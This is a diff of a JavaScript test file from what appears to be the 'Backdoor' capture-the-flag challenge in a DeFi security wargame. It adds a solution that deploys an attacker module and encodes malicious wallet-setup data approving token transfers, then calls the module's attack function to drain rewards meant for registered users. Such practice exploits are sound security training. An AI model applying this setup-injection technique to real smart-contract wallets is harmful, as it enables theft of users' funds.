@@ -37,13 +37,27 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const BackdoorModuleFactory = await ethers.getContractFactory("BackdoorModule", attacker);
+        const backdoorModule = await BackdoorModuleFactory.deploy(this.masterCopy.address, this.walletFactory.address, this.token.address, this.walletRegistry.address);
+        await backdoorModule.deployed();
+
+        // Armado de data maliciosa para setup (función approveTenDVT) 
+        const abiEncode = ["function approveTenDVT(address tokenAddress, address moduleAddress)"];
+        const interfazDelModulo = new ethers.utils.Interface(abiEncode);
+        const dataParaSetup = interfazDelModulo.encodeFunctionData("approveTenDVT", [
+            this.token.address, 
+            backdoorModule.address 
+        ])
+
+        await backdoorModule.attack(users, dataParaSetup);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
         for (let i = 0; i < users.length; i++) {
             let wallet = await this.walletRegistry.wallets(users[i]);
-            
+
             // User must have registered a wallet
             expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");
 
